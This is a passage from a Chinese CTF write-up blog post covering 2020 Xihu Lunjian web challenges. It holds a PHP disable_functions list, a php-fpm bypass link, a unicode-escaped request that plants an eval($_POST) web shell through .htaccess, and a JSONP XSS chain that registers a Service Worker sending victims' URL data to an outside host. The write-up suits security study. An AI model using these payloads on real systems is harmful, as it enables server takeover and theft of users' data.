<pre><code>passthru,exec,system,putenv,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv</code></pre><p>把<a href="https://github.com/Explorersss/exploits中的脚本试过一边后都不行" target="_blank" rel="noopener">https://github.com/Explorersss/exploits中的脚本试过一边后都不行</a></p>
<p>但是这里php-fpm服务是通过socket文件通信的，我们可以直接打php-fpm绕过disable function</p>
<p><a href="https://gist.githubusercontent.com/Explorersss/452ba2ed228dee841ac474b5d96f1581/raw/dc35576e0a4448b33da381fd2980d586aedc4e01/bypass_disable_function_by_fpm.php" target="_blank" rel="noopener">https://gist.githubusercontent.com/Explorersss/452ba2ed228dee841ac474b5d96f1581/raw/dc35576e0a4448b33da381fd2980d586aedc4e01/bypass_disable_function_by_fpm.php</a></p>
<h2 id="easyjson"><a href="#easyjson" class="headerlink" title="easyjson"></a>easyjson</h2><pre><code class="php">&lt;?php
include &#39;security.php&#39;;

if(!isset($_GET[&#39;source&#39;])){
    show_source(__FILE__);
    die();
}
$sandbox = &#39;sandbox/&#39;.sha1($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]).&#39;/&#39;;
var_dump($sandbox);
if(!file_exists($sandbox)){
    mkdir($sandbox);
    file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo &#39;Welcome To Dbapp OSS.&#39;;?&gt;&quot;);
}
$action = $_GET[&#39;action&#39;];
$content = file_get_contents(&quot;php://input&quot;);


if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
    $content = json_decode($content);
    $filename = $_GET[&#39;filename&#39;];
    $filecontent = $content-&gt;content;
    $filename = $sandbox.$filename;
    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
}elseif($action == &quot;reset&quot;){
    $files = scandir($sandbox);
    foreach($files as $file) {
        if(!is_dir($file)){
            if($file !== &quot;index.php&quot;){
                unlink($sandbox.$file);
            }
        }
    }
}
else{
    die(&#39;Security Check Failed.&#39;);
}</code></pre>
<pre><code>POST /?source=1&amp;action=write&amp;filename=index.php HTTP/1.1
Host: easyjson.xhlj.wetolink.com
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 439

{&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;\u0070\u0068\u0070\u005f\u0076\u0061\u006c\u0075\u0065\u0020\u0061\u0075\u0074\u006f\u005f\u0070\u0072\u0065\u0070\u0065\u006e\u0064\u005f\u0066\u0069\u006c\u0065\u0020\u0022\u002e\u0068\u0074\u0061\u0063\u0063\u0065\u0073\u0073\u0022\u000a\u0023\u003c\u003f\u0070\u0068\u0070\u0020\u0065\u0076\u0061\u006c\u0028\u0024\u005f\u0050\u004f\u0053\u0054\u005b\u0031\u005d\u0029\u003b\u003f\u003e&quot;}</code></pre><p>flag{a5db5397505f825334aa4dfc17d3bb9f}</p>
<h2 id="hardxss"><a href="#hardxss" class="headerlink" title="hardxss"></a>hardxss</h2><p>在登入接口发现如下代码：</p>
<pre><code class="javascript">callback = &quot;get_user_login_status&quot;;
        auto_reg_var();
        if(typeof(jump_url) == &quot;undefined&quot; || /^\//.test(jump_url)){
            jump_url = &quot;/&quot;;
        }
        jsonp(&quot;https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback=&quot; + callback,function(result){
            if(result[&#39;status&#39;]){
                location.href = jump_url;
            }
        })
        function jsonp(url, success) {
            var script = document.createElement(&quot;script&quot;);
            if(url.indexOf(&quot;callback&quot;) &lt; 0){
                var funName = &#39;callback_&#39; + Date.now() + Math.random().toString().substr(2, 5);
                url = url + &quot;?&quot; + &quot;callback=&quot; + funName;
            }else{
                var funName = callback;
            }
            window[funName] = function(data) {
                success(data);
                delete window[funName];
                document.body.removeChild(script);
            }
            script.src = url;
            document.body.appendChild(script);
        }
        function auto_reg_var(){
            var search = location.search.slice(1);
            var search_arr = search.split(&#39;&amp;&#39;);
            for(var i = 0;i &lt; search_arr.length; i++){
                [key,value] = search_arr[i].split(&quot;=&quot;);
                window[key] = value;
            }
        }</code></pre>
<p>利用jsonp任意xss</p>
<p>view-source:<a href="https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22//ffffuck.free.beeceptor.com/%22)" target="_blank" rel="noopener">https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22//ffffuck.free.beeceptor.com/%22)</a>;</p>
<p>利用Service Workers从xss.hardxss.xhlj.wetolink.com移动到auth.hardxss.xhlj.wetolink.com</p>
<p><a href="https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22//abcde.free.beeceptor.com/2%22);//" target="_blank" rel="noopener">https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22//abcde.free.beeceptor.com/2%22);//</a></p>
<p>2:</p>
<pre><code class="javascript">document.domain=&quot;hardxss.xhlj.wetolink.com&quot;;
a=document.createElement(&quot;iframe&quot;);
a.src=&quot;https://auth.hardxss.xhlj.wetolink.com&quot;;
document.body.append(a);
document.getElementsByTagName(&quot;iframe&quot;)[0].addEventListener(&quot;load&quot;,()=&gt;{fuck()})
function fuck(){
    var code = `navigator.serviceWorker.register(&quot;/api/loginStatus?callback=self.importScripts(&#39;//serviceworker.free.beeceptor.com/exp.js&#39;);//&quot;)`;
    document.getElementsByTagName(&quot;iframe&quot;)[0].contentWindow.eval(code);
}
</code></pre>
<p>/:</p>
<pre><code class="javascript">self.addEventListener(&#39;fetch&#39;, function(event) {
  event.respondWith(new Response(&#39;&lt;html&gt;&lt;script&gt;document.location.href=&quot;http://ccreater.top:60000/?&quot;+document.location.search&lt;/script&gt;&lt;/html&gt;&#39;,{headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }}));
});</code></pre>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201015222800.png" alt="image5725"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201015222516.png" alt="image5832"></p>
<p>详细说明见：<a href="http://blog.ccreater.top/2020/10/15/Service%20Worker/" target="_blank" rel="noopener">http://blog.ccreater.top/2020/10/15/Service%20Worker/</a></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/10/15/2020西湖论剑/">https://www.ccreater.top/2020/10/15/2020西湖论剑/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/2020/10/15/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" data-id="ckmn5dcd3000qjsni1p5kee1g" data-title="2020西湖论剑" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/">Next -&gt;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 11.67px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/01/14/real%20world%20ctf%202020/">real world ctf 2020</a>
          </li>
        
          <li>
            <a href="/2020/12/14/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/">2020xnuca_ezwp题解</a>
          </li>
        
          <li>
            <a href="/2020/11/27/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
          </li>
        
          <li>
            <a href="/2020/11/24/2020%E7%A5%A5%E4%BA%91%E6%9D%AFweb%E9%A2%98%E8%A7%A3/">2020祥云杯web题解</a>
          </li>
        
          <li>
            <a href="/2020/11/13/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/">XNUCA_2020_oooooooldjs题解</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 ccreater<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":100},"mobile":{"show":true},"react":{"opacity":0.7},"dialog":{"enable":true,"hitokoto":true},"log":false});</script></body>
</html>